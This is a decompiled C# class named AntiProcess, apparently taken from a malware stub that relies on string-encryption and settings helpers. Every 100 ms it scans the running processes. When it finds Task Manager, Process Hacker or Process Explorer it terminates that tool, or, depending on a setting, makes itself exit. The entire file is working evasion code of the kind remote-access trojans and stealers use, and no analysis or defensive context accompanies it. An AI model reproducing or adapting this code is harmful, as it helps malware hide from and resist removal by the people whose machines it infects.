using System;
using System.Runtime.InteropServices;
using System.Threading;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000004 RID: 4
	public static class AntiProcess
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000209D File Offset: 0x0000029D
		public static void BLock()
		{
			for (;;)
			{
				AntiProcess.Process();
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000026EC File Offset: 0x000008EC
		public static void Process()
		{
			try
			{
				IntPtr intPtr = DllImport.CreateToolhelp32Snapshot(2U, 0U);
				PROCESSENTRY32 processentry = default(PROCESSENTRY32);
				processentry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
				if (DllImport.Process32First(intPtr, ref processentry))
				{
					do
					{
						uint th32ProcessID = processentry.th32ProcessID;
						string szExeFile = processentry.szExeFile;
						foreach (string target in "Taskmgr.exe,ProceessHacker.exe,procexp.exe".Split(new char[]
						{
							","[0]
						}))
						{
							if (AntiProcess.Matches(szExeFile, target))
							{
								if (Convert.ToBoolean(Settings.AntiProcessMode))
								{
									AntiProcess.KillProcess(th32ProcessID);
								}
								else
								{
									Environment.Exit(0);
								}
							}
						}
					}
					while (DllImport.Process32Next(intPtr, ref processentry));
				}
				DllImport.CloseHandle(intPtr);
			}
			catch
			{
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000020AC File Offset: 0x000002AC
		public static bool Matches(string source, string target)
		{
			return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000020B6 File Offset: 0x000002B6
		public static void KillProcess(uint processId)
		{
			IntPtr intPtr = DllImport.OpenProcess(1U, false, processId);
			DllImport.TerminateProcess(intPtr, 0);
			DllImport.CloseHandle(intPtr);
		}
	}
}
